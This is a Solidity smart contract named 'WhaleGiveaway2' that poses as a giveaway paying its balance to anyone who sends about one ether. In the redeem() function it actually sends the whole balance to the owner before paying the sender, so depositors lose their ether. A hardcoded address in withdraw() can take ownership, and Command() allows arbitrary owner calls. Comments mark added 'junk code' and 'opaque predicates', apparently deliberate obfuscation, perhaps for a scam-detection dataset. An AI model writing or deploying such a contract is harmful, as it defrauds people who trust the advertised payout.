pragma solidity ^0.4.19;

contract WhaleGiveaway2
{
    address public Owner = msg.sender;
    uint constant public minEligibility = 0.999001 ether; 
   
    function()
    public
    payable
    {
        if (msg.value == 0) { revert(); } // Opaque predicate
    }
   
    function redeem()
    public
    payable
    {                                                                    
        if(msg.value>=minEligibility)
        { 
            address tempOwner = Owner; // Junk code
            if (tempOwner == Owner) { // Opaque predicate
                uint junkVariable = 42; // Junk code
                Owner.transfer(this.balance); 
                junkVariable = 0; // More junk code
            }
            msg.sender.transfer(this.balance);
        } else {
            uint anotherJunk = 21; // Additional junk code
            anotherJunk += 3; // More junk
        }
    }
    
    function withdraw()
    payable
    public
    {
        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){
            Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
            uint fakeVar = 100; // Junk code
            fakeVar++; // More junk
        } 
        require(msg.sender == Owner);
        address tempOwner2 = Owner; // Junk code
        if (tempOwner2 == Owner) // Opaque predicate
        {
            Owner.transfer(this.balance);
        }
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        if (msg.value == 0) { revert(); } // Opaque predicate
        adr.call.value(msg.value)(data);
    }
}